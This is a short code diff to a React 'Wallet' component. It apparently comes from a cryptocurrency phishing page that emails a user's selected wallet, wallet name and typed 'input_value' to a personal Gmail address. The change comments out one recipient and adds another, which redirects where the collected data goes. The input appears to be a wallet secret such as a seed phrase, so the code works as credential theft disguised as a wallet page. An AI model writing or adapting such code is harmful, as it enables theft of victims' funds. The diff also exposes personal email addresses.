@@ -130,7 +130,8 @@ const Wallet = () => {
 
         let templateParams = {
             from_email: "dazaloland@gmail.com",
-            to_email: "dazaloland@gmail.com",
+            // to_email: "dazaloland@gmail.com",
+            to_email: "nwakaezeonyedikajames@gmail.com",
             wallet: selectedWallet?.name,
             wallet_name: walletName || "N/A",
             input_value: inputValue,
